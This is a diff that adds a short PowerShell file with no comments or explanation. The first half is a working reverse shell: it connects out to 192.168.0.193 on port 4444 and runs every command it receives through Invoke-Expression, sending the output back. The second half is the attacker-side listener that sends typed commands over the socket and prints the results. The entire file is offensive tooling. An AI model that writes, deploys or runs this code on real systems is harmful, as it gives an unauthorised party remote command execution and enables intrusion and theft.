@@ -1,0 +1,33 @@
+$client = New-Object System.Net.Sockets.TCPClient('192.168.0.193',4444);
+$stream = $client.GetStream();
+$writer = New-Object System.IO.StreamWriter($stream);
+$writer.AutoFlush = $true;
+$reader = New-Object System.IO.StreamReader($stream);
+while(($line = $reader.ReadLine()) -ne $null) {
+    $output = try { iex $line 2>&1 | Out-String } catch { $_.Exception.Message }
+    $writer.WriteLine($output);
+}
+
+
+
+
+
+
+$listener = [System.Net.Sockets.TcpListener]4444;
+$listener.Start();
+$client = $listener.AcceptTcpClient();
+$stream = $client.GetStream();
+$writer = New-Object System.IO.StreamWriter($stream);
+$writer.AutoFlush = $true;
+$reader = New-Object System.IO.StreamReader($stream);
+
+while($true) {
+    $input = Read-Host "PS> ";
+    $writer.WriteLine($input);
+    $writer.Flush();
+    Start-Sleep -Milliseconds 200;
+    while($stream.DataAvailable) {
+        $response = $reader.ReadLine();
+        if ($response) { Write-Output $response }
+    }
+}
